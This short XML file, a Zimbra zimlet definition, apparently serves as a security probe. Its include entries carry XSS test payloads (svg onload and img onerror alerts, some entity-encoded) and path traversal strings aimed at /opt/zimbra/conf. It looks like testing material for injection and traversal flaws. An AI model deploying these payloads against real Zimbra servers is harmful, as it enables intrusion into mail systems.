<zimlet name="phil"
    version="8.5.0"
	    label="${msg.label}"
		    description="${msg.description}"
			    extension="false">
<include>\<svg onload=alert(1)\></include>
<include>opt/zimbra/conf/img: &lt;img src=qq onerror=alert(2)&gt;&lt;&#48;img&gt;</include>
<include>/opt/zimbra/conf/img &lt;img src=qq onerror=alert(2)&gt;&lt;&#48;img&gt;</include>
<include>../../../../../opt/zimbra/conf/blahblah.txt</include>
<include>../.^C./.^C^C./opt/zimbra/conf/cntlcntl.txt</include>
<include>html.html</include>
<include>svg: \<svg onload=alert(1)\></include>
						    <disableUIUndeploy>FALSE</disableUIUndeploy>
							</zimlet>
